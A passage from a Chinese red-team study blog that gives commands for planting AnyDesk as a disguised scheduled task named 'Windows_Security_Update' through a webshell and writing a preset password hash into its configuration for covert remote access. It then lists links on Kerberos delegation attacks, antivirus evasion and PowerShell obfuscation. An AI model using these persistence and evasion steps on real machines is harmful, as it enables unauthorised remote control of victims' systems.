class="hljs-selector-class">.id</span></code></pre><p>Webshell中将Anydesk上传受害者机器，运行一遍Anydesk，然后kill掉</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM AnyDesk.exe</code></pre><p>在进入到</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\&#123;</span>username&#125;<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\A</span>nyDesk</code></pre><p>路径把以上两个配置写入到service.conf文件下</p><p>连接</p><p>命令复现</p><pre><code class="hljs css"><span class="hljs-selector-tag">powershelgl</span><span class="hljs-selector-class">.exe</span> &quot;(<span class="hljs-selector-tag">New-Object</span> <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.WebClient</span>)<span class="hljs-selector-class">.DownloadFile</span>(\&quot;<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">download</span><span class="hljs-selector-class">.anydesk</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">AnyDesk</span><span class="hljs-selector-class">.exe</span>\&quot;,\&quot;<span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">inetpub</span>\<span class="hljs-selector-tag">wwwroot</span>\<span class="hljs-selector-tag">WinUpdate</span><span class="hljs-selector-class">.exe</span>\&quot;)&quot;</code></pre><p>确定有哪些用户当前正在使用桌面：</p><pre><code class="hljs lsl">powershelgl.exe <span class="hljs-string">&quot;(((Get-WmiObject -Class Win32_Process -Filter &#x27;Name=<span class="hljs-subst">\&quot;</span>explorer.exe<span class="hljs-subst">\&quot;</span>&#x27;).GetOwner().User) -split &#x27;<span class="hljs-subst">\n</span>&#x27;)&quot;</span></code></pre><p>创建一个计划任务:</p><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/Create</span> <span class="hljs-string">/TN</span> Windows_Security_Update <span class="hljs-string">/SC</span> monthly <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:\inetpub\wwwroot\WinUpdate.exe&quot;</span> <span class="hljs-string">/RU</span> administrator</code></pre><p>先执行一次生成配置文件：</p><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>tn Windows_Security_Update</code></pre><p>结束掉进程：</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM WinUpdate.exe</code></pre><p>添加密码</p><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> ad.anynet.pwd_hash=a<span class="hljs-number">7</span>f<span class="hljs-number">9</span>ef<span class="hljs-number">816567</span>ddeb<span class="hljs-number">071</span>c<span class="hljs-number">985771698</span>c<span class="hljs-number">70</span>a<span class="hljs-number">6</span>aec<span class="hljs-number">4</span>c<span class="hljs-number">70</span>dc<span class="hljs-number">284943</span>b<span class="hljs-number">3104</span>dcc<span class="hljs-number">06</span>b<span class="hljs-number">8184</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf
<span class="hljs-attribute">echo</span> ad.anynet.pwd_salt=<span class="hljs-number">5</span>afbd<span class="hljs-number">8</span>fc<span class="hljs-number">7334032</span>ddbddd<span class="hljs-number">489363</span>e<span class="hljs-number">25</span>f<span class="hljs-number">8</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf</code></pre><p>利用需要一定条件，除此之外也需要考虑WebShell免杀。</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.moonsec.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">1098</span>   --云渗透思路</code></pre><hr><h2 id="7、Kerberos域内委派攻击（重要了解）"><a href="#7、Kerberos域内委派攻击（重要了解）" class="headerlink" title="7、Kerberos域内委派攻击（重要了解）"></a>7、Kerberos域内委派攻击（重要了解）</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7217</span>   --域渗透——Kerberos委派攻击
https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7517</span>   --Kerberos之域内委派攻击
https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">4</span>d3be28.html    --跟着先知社区复现文章
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/backlion/</span>p/<span class="hljs-number">10537813</span>.html  --老文章思路
https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">166934</span>   --攻击活动目录：无约束委派及域林信任
https:<span class="hljs-regexp">//</span>shenaniganslabs.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">01</span><span class="hljs-regexp">/28/</span>Wagging-the-Dog.html   --最详细的介绍，有视频，但是全英文，感谢大佬</code></pre><p>认真看完，就能熟悉了…</p><hr><h2 id="8、ATT-amp-CK攻防初窥系列-执行篇"><a href="#8、ATT-amp-CK攻防初窥系列-执行篇" class="headerlink" title="8、ATT&amp;CK攻防初窥系列-执行篇"></a>8、ATT&amp;CK攻防初窥系列-执行篇</h2><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9787</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">--ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（一）
<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-10014</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（二）
<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9857</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>横向移动篇（一）</code></pre><p>感谢看雪大佬！！</p><hr><h2 id="9、Powershell"><a href="#9、Powershell" class="headerlink" title="9、Powershell"></a>9、Powershell</h2><h3 id="利用360正则不严执行-powershell上线"><a href="#利用360正则不严执行-powershell上线" class="headerlink" title="利用360正则不严执行 powershell上线"></a>利用360正则不严执行 powershell上线</h3><p>powershell无文件利用自blackhat演讲至今已经过去近5年,将来的日子会越来越不好过，windows的审计会越来越细，以后将是.NET的天下。从CS推荐使用.NET内存加载开始就已经慢慢变成红队的主流（execute-assembly）</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7903</span>   --感谢大佬的思路和技术，<span class="hljs-number">6</span>月份最新的复现
https:<span class="hljs-regexp">//</span>www.chabug.org<span class="hljs-regexp">/web/</span><span class="hljs-number">1324</span>.html   --感谢s1ye大佬</code></pre><p>书中还有更好的思路，找时间按照书里的复现写出来…</p><hr><h3 id="关于-Powershell抗安全软件"><a href="#关于-Powershell抗安全软件" class="headerlink" title="关于 Powershell抗安全软件"></a>关于 Powershell抗安全软件</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.kanxue.com/book-<span class="hljs-number">38</span>-<span class="hljs-number">473</span>.htm   --看雪高级渗透课堂！
https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">36250656</span>   --原文</code></pre><p>参考</p><ul><li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN</a></li><li><a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li></ul><hr><h3 id="Invoke-Obfuscation介绍"><a href="#Invoke-Obfuscation介绍" class="headerlink" title="Invoke-Obfuscation介绍"></a>Invoke-Obfuscation介绍</h3><ul><li><a target="_blank" rel="noopener" href="https://buaq.net/go-23754.html">https://buaq.net/go-23754.html</a> –powershell配合Invoke-Obfuscation</li><li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86637">https://www.anquanke.com/post/id/86637</a> –powershell 混淆</li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1044940">https://cloud.tencent.com/developer/article/1044940</a> –Powershell编码与混淆</li></ul></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/b25a2f1c.html">http://www.secice.cn/p/b25a2f1c.html</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/2197435e.html"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">红队攻防学习之穿透与转发</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/28ca3946.html"><span class="hidden-mobile">红队攻防学习之打点进内网</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="/js/qipao.js"></script><script src="/js/jingtaisidai.js"></script><script src="/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>